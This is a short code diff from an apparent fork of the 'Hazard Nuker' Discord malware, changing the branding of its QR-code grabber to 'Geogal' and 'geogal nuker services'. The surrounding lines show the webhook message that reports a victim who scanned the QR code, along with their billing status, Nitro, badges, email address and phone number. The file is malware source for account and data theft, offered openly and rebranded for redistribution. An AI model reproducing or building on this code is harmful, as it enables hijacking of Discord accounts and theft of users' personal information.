@@ -177,8 +177,8 @@ def QR_Grabber(Webhook):
                 "embeds": [
                     {
                         "author": {
-                            "name": "Hazard QR Code Grabber",
-                            "url": "https://github.com/Rdimo/Hazard-Nuker",
+                            "name": "Geogal QR Code Grabber",
+                            "url": "https://github.com/Geogal3/Hazard-Nuker",
                             "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
                         },
                         "description": f"**{user}** Just Scanned the QR code\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
@@ -192,7 +192,7 @@ def QR_Grabber(Webhook):
                         "color": 8388736,
 
                         "footer": {
-                          "text": "©Rdimo#6969 https://github.com/Rdimo/Hazard-Nuker"
+                          "text": "geogal nuker services"
                         }
                     }
                 ]
